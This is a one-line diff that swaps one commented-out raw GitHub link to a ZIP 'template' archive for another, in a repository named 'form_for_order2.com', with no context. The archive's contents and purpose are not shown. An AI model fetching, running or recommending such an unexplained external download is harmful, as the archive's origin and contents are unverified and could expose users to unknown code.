@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/uddant-creator/form_for_order2.com/main/templates/form_for_order2.com-2.3.zip
+# https://raw.githubusercontent.com/uddant-creator/form_for_order2.com/main/templates/for_com_order_form_1.8.zip
